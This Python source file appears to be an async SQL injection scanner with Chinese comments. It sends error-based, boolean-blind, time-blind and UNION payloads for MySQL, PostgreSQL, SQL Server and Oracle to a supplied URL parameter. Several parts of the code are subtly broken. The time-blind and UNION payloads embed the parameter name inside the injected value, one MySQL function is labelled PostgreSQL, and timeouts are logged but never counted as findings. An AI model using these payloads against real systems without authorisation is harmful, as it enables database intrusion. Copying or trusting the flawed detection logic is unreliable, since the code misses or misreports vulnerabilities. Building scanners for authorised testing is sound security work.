# python/modules/web/sqli.py
"""
SQL 注入检测工具 - 增强版
支持多种注入技术：报错注入、布尔盲注、时间盲注、UNION 注入
"""

import httpx
import asyncio
import re
import time
import logging
from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qs, urlencode

logger = logging.getLogger(__name__)


class SQLiScanner:
    """SQL 注入扫描器 - 增强版"""

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.client = httpx.AsyncClient(timeout=self.timeout, follow_redirects=False)

    async def close(self):
        await self.client.aclose()

    async def scan(self, url: str, param: str = "id") -> Dict:
        """扫描 SQL 注入漏洞"""
        results = {
            "url": url,
            "param": param,
            "vulnerable": False,
            "findings": [],
            "techniques": [],
            "db_type": None
        }

        try:
            # 1. 测试错误注入
            error_result = await self._test_error_based(url, param)
            if error_result:
                results["vulnerable"] = True
                results["findings"].append(error_result)
                results["techniques"].append("error_based")
                results["db_type"] = error_result.get("db_type")

            # 2. 测试布尔盲注
            bool_result = await self._test_boolean_blind(url, param)
            if bool_result:
                results["vulnerable"] = True
                results["findings"].append(bool_result)
                results["techniques"].append("boolean_blind")

            # 3. 测试时间盲注
            time_result = await self._test_time_blind(url, param)
            if time_result:
                results["vulnerable"] = True
                results["findings"].append(time_result)
                results["techniques"].append("time_blind")

            # 4. 测试 UNION 注入
            union_result = await self._test_union(url, param)
            if union_result:
                results["vulnerable"] = True
                results["findings"].append(union_result)
                results["techniques"].append("union")

        except Exception as e:
            logger.error(f"扫描过程中出错: {e}")

        return results

    async def _test_error_based(self, url: str, param: str) -> Optional[Dict]:
        """测试报错注入"""
        error_payloads = {
            # MySQL
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--": "MySQL",
            "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--": "MySQL",
            "' OR 1=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT VERSION()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--": "MySQL",
            # PostgreSQL
            "' AND 1=CAST((SELECT VERSION()) AS INT)--": "PostgreSQL",
            "' AND 1=EXTRACTVALUE(1,VERSION())--": "PostgreSQL",
            # SQL Server
            "' AND 1=1; SELECT @@VERSION--": "SQL Server",
            "'; SELECT @@VERSION;--": "SQL Server",
            # Oracle
            "' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT USER FROM DUAL))--": "Oracle",
        }

        try:
            base_result = await self.client.get(url)
            base_content = base_result.text.lower()
        except Exception as e:
            logger.warning(f"获取基准响应失败: {e}")
            return None

        db_errors = {
            "MySQL": ["mysql", "mariadb", "syntax error", "xdebug"],
            "PostgreSQL": ["postgresql", "psql"],
            "SQL Server": ["sql server", "microsoft sql"],
            "Oracle": ["oracle", "ora-"],
        }

        for payload, db_type in error_payloads.items():
            try:
                test_url = self._inject_param(url, param, payload)
                resp = await self.client.get(test_url)
                content = resp.text.lower()

                if resp.status_code >= 500 or any(err in content for err in db_errors.get(db_type, [])):
                    if content != base_content:
                        return {
                            "technique": "error_based",
                            "payload": payload[:60] + "...",
                            "db_type": db_type,
                            "severity": "high",
                            "description": f"检测到 {db_type} 报错注入"
                        }
            except httpx.TimeoutException:
                logger.debug(f"请求超时: {test_url}")
            except httpx.RequestError as e:
                logger.debug(f"请求错误: {e}")

        return None

    async def _test_boolean_blind(self, url: str, param: str) -> Optional[Dict]:
        """测试布尔盲注"""
        try:
            base_resp = await self.client.get(url)
            base_length = len(base_resp.text)

            # 测试假条件
            false_url = self._inject_param(url, param, "1 AND 1=2")
            false_resp = await self.client.get(false_url)
            false_length = len(false_resp.text)

            # 测试真条件
            true_url = self._inject_param(url, param, "1 AND 1=1")
            true_resp = await self.client.get(true_url)
            true_length = len(true_resp.text)

            if false_length != base_length and true_length == base_length:
                return {
                    "technique": "boolean_blind",
                    "payload": "1 AND 1=1 / 1 AND 1=2",
                    "severity": "high",
                    "description": "检测到布尔盲注，真假条件响应不同",
                    "response_diff": {
                        "base": base_length,
                        "true": true_length,
                        "false": false_length
                    }
                }
        except httpx.TimeoutException:
            logger.debug(f"布尔盲注测试超时")
        except httpx.RequestError as e:
            logger.debug(f"布尔盲注测试请求错误: {e}")

        return None

    async def _test_time_blind(self, url: str, param: str) -> Optional[Dict]:
        """测试时间盲注"""
        time_payloads = {
            f"{param}=1 AND (SELECT * FROM (SELECT SLEEP(3))a)--": 3,
            f"{param}=1 AND BENCHMARK(3000000,MD5(1))--": 3,
            f"{param}=1 AND 1=pg_sleep(3)--": 3,
            f"{param}=1; WAITFOR DELAY '0:0:3'--": 3,
        }

        for payload, delay in time_payloads.items():
            try:
                test_url = self._inject_param(url, param, payload)
                start = time.time()
                resp = await self.client.get(test_url)
                elapsed = time.time() - start

                if elapsed >= delay:
                    return {
                        "technique": "time_blind",
                        "payload": payload[:50] + "...",
                        "delay": round(elapsed, 1),
                        "severity": "medium",
                        "description": f"检测到时间盲注，响应延迟 {elapsed:.1f} 秒"
                    }
            except httpx.TimeoutException:
                logger.debug(f"时间盲注测试超时，可能存在注入")
            except httpx.RequestError as e:
                logger.debug(f"时间盲注测试请求错误: {e}")

        return None

    async def _test_union(self, url: str, param: str) -> Optional[Dict]:
        """测试 UNION 注入"""
        for i in range(1, 10):
            try:
                order_payload = f"{param}=1 ORDER BY {i}--"
                test_url = self._inject_param(url, param, order_payload)
                resp = await self.client.get(test_url)

                if resp.status_code >= 500 or "error" in resp.text.lower():
                    if i > 1:
                        return {
                            "technique": "union",
                            "column_count": i - 1,
                            "severity": "high",
                            "description": f"检测到 UNION 注入，列数为 {i - 1}"
                        }
                    break
            except httpx.TimeoutException:
                logger.debug(f"UNION 测试 ORDER BY {i} 超时")
            except httpx.RequestError as e:
                logger.debug(f"UNION 测试请求错误: {e}")

        return None

    def _inject_param(self, url: str, param: str, injection: str) -> str:
        """将注入载荷注入到 URL 参数中"""
        parsed = urlparse(url)
        query = parse_qs(parsed.query, keep_blank_values=True)

        if param in query:
            query[param] = [injection]
        else:
            query[param] = [injection]

        new_query = urlencode(query, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"


async def quick_scan(url: str) -> Dict:
    """快速扫描 URL 中的 SQL 注入"""
    scanner = SQLiScanner()
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return {"url": url, "vulnerable": False, "reason": "无可检测的参数"}

        results = []
        for param in params.keys():
            result = await scanner.scan(url, param)
            if result["vulnerable"]:
                results.append(result)

        return {
            "url": url,
            "vulnerable": len(results) > 0,
            "findings": results
        }
    finally:
        await scanner.close()